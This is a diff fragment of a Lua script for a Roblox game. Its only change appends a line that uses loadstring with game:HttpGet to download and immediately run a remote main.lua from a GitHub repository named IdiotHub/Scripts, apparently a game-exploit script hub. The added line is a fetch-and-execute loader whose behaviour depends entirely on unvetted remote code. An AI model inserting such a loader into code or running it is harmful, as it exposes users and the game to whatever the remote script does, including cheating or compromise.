@@ -106,3 +106,5 @@ game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Framew
         end
     end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IdiotHub/Scripts/refs/heads/main/BGSI/main.lua"))()
